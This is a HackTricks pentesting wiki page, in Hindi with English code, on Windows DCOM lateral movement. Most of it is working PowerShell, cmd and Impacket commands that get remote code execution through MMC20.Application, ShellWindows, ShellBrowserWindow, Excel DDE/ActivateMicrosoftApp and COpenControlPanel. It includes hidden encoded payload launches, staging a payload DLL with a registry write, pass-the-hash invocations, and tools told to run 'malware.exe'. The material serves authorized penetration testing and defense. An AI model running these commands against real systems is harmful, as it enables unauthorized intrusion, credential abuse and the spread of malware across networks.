# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement आकर्षक है क्योंकि यह service या scheduled task बनाने के बजाय RPC/DCOM पर exposed मौजूदा COM servers का पुनः उपयोग करता है। व्यवहार में इसका अर्थ है कि initial connection आमतौर पर TCP/135 पर शुरू होता है और फिर dynamically assigned high RPC ports पर चला जाता है।

## Prerequisites & Gotchas

- आमतौर पर target पर local administrator context की आवश्यकता होती है और remote COM server को remote launch/activation की अनुमति होनी चाहिए।
- **March 14, 2023** से Microsoft supported systems के लिए DCOM hardening लागू करता है। पुराने clients, जो low activation authentication level का अनुरोध करते हैं, विफल हो सकते हैं, जब तक कि वे कम-से-कम `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` पर negotiate न करें। Modern Windows clients आमतौर पर स्वतः उच्च स्तर पर सेट हो जाते हैं, इसलिए current tooling सामान्यतः काम करती रहती है।<sup>[[3]](#references)</sup>
- Manual या scripted DCOM execution के लिए सामान्यतः TCP/135 और target की dynamic RPC port range आवश्यक होती है। यदि आप Impacket के `dcomexec.py` का उपयोग कर रहे हैं और command output वापस चाहते हैं, तो आमतौर पर `ADMIN$` (या किसी अन्य writable/readable share) तक SMB access की भी आवश्यकता होती है।
- यदि RPC/DCOM काम करता है लेकिन SMB blocked है, तो `dcomexec.py -nooutput` blind execution के लिए फिर भी उपयोगी हो सकता है।

त्वरित जाँच:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

इस technique के बारे में अधिक जानकारी के लिए [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) देखें।<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects, objects के साथ network-based interactions के लिए एक रोचक capability प्रदान करते हैं। Microsoft, DCOM और Component Object Model (COM) दोनों के लिए comprehensive documentation प्रदान करता है, जो [यहाँ DCOM के लिए](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [यहाँ COM के लिए](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) उपलब्ध है। PowerShell command का उपयोग करके DCOM applications की list प्राप्त की जा सकती है:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in operations की scripting को सक्षम करता है। विशेष रूप से, इस object में `Document.ActiveView` के अंतर्गत एक `ExecuteShellCommand` method शामिल है। इस method के बारे में अधिक जानकारी [यहाँ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) मिल सकती है। इसे चलाकर जाँचें:<sup>[[6]](#references)</sup>

यह feature DCOM application के माध्यम से network पर commands execute करने की सुविधा देता है। Admin के रूप में DCOM के साथ remotely interact करने के लिए PowerShell का उपयोग इस प्रकार किया जा सकता है:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
यह command DCOM application से connect करता है और COM object का एक instance return करता है। इसके बाद remote host पर process execute करने के लिए ExecuteShellCommand method को invoke किया जा सकता है। इस process में निम्नलिखित steps शामिल हैं:

Methods check करें:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE प्राप्त करें:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
अंतिम argument window style है। `7` window को minimized रखता है। Operationally, MMC-based execution के कारण आमतौर पर remote `mmc.exe` process आपके payload को spawn करता है, जो नीचे दिए गए Explorer-backed objects से अलग है।

## ShellWindows & ShellBrowserWindow

**इस technique के बारे में अधिक जानकारी के लिए original post देखें [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object में explicit "LaunchPermissions" नहीं पाए गए। यह डिफ़ॉल्ट रूप से ऐसी permissions पर निर्भर करता है जो Administrators को access की अनुमति देती हैं। अधिक जानकारी के लिए [यह thread](https://twitter.com/tiraniddo/status/817532039771525120) देखा जा सकता है। Explicit Launch Permission के बिना objects को filter करने के लिए [@tiraniddo](https://twitter.com/tiraniddo) के OleView .NET का उपयोग recommended है।

दो specific objects, `ShellBrowserWindow` और `ShellWindows`, को explicit Launch Permissions न होने के कारण highlight किया गया। `HKCR:\AppID\{guid}` के अंतर्गत `LaunchPermission` registry entry का न होना explicit permissions न होने का संकेत है।

`MMC20.Application` की तुलना में, ये objects OPSEC के दृष्टिकोण से अक्सर अधिक शांत होते हैं, क्योंकि remote host पर command आमतौर पर `mmc.exe` के बजाय `explorer.exe` की child बन जाती है।

### ShellWindows

`ShellWindows`, जिसमें ProgID नहीं है, उसके लिए .NET methods `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके AppID का उपयोग करके object instantiation को संभव बनाते हैं। यह process `ShellWindows` का CLSID प्राप्त करने के लिए OleView .NET का उपयोग करता है। Object instantiate होने के बाद, `WindowsShell.Item` method के माध्यम से interaction संभव है, जिससे `Document.Application.ShellExecute` जैसे method invocation किए जा सकते हैं।

Object को instantiate करने और remotely commands execute करने के लिए example PowerShell commands दिए गए थे:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` समान है, लेकिन आप इसे सीधे इसके CLSID के माध्यम से instantiate कर सकते हैं और `Document.Application.ShellExecute` पर pivot कर सकते हैं:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects के साथ Lateral Movement

DCOM Excel objects का exploitation करके Lateral Movement हासिल किया जा सकता है। विस्तृत जानकारी के लिए, DCOM के माध्यम से Lateral Movement हेतु Excel DDE का उपयोग करने पर [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) में दी गई चर्चा पढ़ने की सलाह दी जाती है।<sup>[[5]](#references)</sup>

Empire project एक PowerShell script प्रदान करता है, जो DCOM objects में हेरफेर करके remote code execution (RCE) के लिए Excel के उपयोग को प्रदर्शित करती है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) में उपलब्ध script के snippets दिए गए हैं, जो RCE के लिए Excel का दुरुपयोग करने के विभिन्न methods दिखाते हैं:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
हालिया research ने इस क्षेत्र का विस्तार `Excel.Application` के `ActivateMicrosoftApp()` method के साथ किया है। मुख्य विचार यह है कि Excel, system `PATH` में खोज करके FoxPro, Schedule Plus या Project जैसे पुराने Microsoft applications को launch करने का प्रयास कर सकता है। यदि कोई operator target के `PATH` में शामिल किसी writable location में अपेक्षित नामों में से किसी एक नाम वाला payload रख सकता है, तो Excel उसे execute कर देगा।<sup>[[4]](#references)</sup>

इस variation के लिए requirements:

- Target पर Local admin
- Target पर Excel installed
- Target के `PATH` में किसी writable directory में payload लिखने की ability

FoxPro lookup (`FOXPROW.exe`) का abuse करने वाला practical example:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
यदि attacking host पर local `Excel.Application` ProgID registered नहीं है, तो इसके बजाय CLSID द्वारा remote object को instantiate करें:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Values seen abused in practice:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — registered Control Panel DLL लोड करना

`COpenControlPanel` class (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) को expose करती है। इसका `Open()` method `Control Panel\Cpls` key के अंतर्गत registered Control Panel DLLs को remote `dllhost.exe` द्वारा लोड करवाता है। Tested systems पर इस class में कोई explicit launch/access permissions नहीं थीं, इसलिए यह default DCOM policy को inherit करती है (जिसमें आमतौर पर remote activation के लिए administrator privileges आवश्यक होते हैं)। `Open()` को registered DLLs process करवाने के लिए कोई random item name पर्याप्त है; payload के लिए `.cpl` extension आवश्यक नहीं है, हालांकि यह सही architecture की valid DLL होनी चाहिए।<sup>[[7]](#references)</sup>

यह primitive **stage-and-trigger** है, command-only execution नहीं: पहले target पर DLL copy करें और ऐसा `REG_EXPAND_SZ` value बनाएँ जो उसकी ओर point करे, फिर object को DCOM के माध्यम से activate करें। उदाहरण के लिए, administrative Windows context से:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
public [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client, Impacket के साथ undocumented DCOM call को implement करता है। किसी arbitrary Control Panel item name की आपूर्ति करना पर्याप्त है; client RPC error report कर सकता है, भले ही `dllhost.exe` ने DLL load कर लिया हो।<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Operationally, इस path के लिए file-write channel और remote registry access भी आवश्यक हैं, इसलिए यह `MMC20`/`ShellWindows` की तुलना में अधिक noisy है। यह persistence side effect उत्पन्न करता है, क्योंकि बाद में Control Panel खोलने पर वही entry फिर से load हो सकती है। Execution के बाद value हटा दें और `dllhost.exe` में असामान्य DLL loads के साथ unexpected `Control Panel\Cpls` values की तलाश करें।<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Lateral Movement के लिए Automation Tools

इन techniques को automate करने के लिए दो tools प्रमुख हैं:

- **Invoke-DCOM.ps1**: Empire project द्वारा प्रदान की गई एक PowerShell script, जो remote machines पर code execute करने के लिए विभिन्न methods के invocation को सरल बनाती है। यह script Empire GitHub repository में उपलब्ध है।

- **SharpLateral**: Remote रूप से code execute करने के लिए design किया गया एक tool, जिसका उपयोग निम्न command के साथ किया जा सकता है:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) अन्य machines में code execute करने के सभी commented तरीकों को आसानी से invoke करने की अनुमति देती है।
- आप DCOM का उपयोग करके remote systems पर commands execute करने के लिए Impacket के `dcomexec.py` का उपयोग कर सकते हैं। Current builds `ShellWindows`, `ShellBrowserWindow` और `MMC20` को support करते हैं, और default रूप से `ShellWindows` का उपयोग करते हैं।
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- आप [**SharpMove**](https://github.com/0xthirteen/SharpMove) का भी उपयोग कर सकते हैं
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass के लिए बदलाव प्रबंधित करना (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application की शक्ति का दुरुपयोग](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM के माध्यम से lateral movement के लिए Excel DDE का उपयोग](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Remote command execution के लिए DCOM objects का उपयोग](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
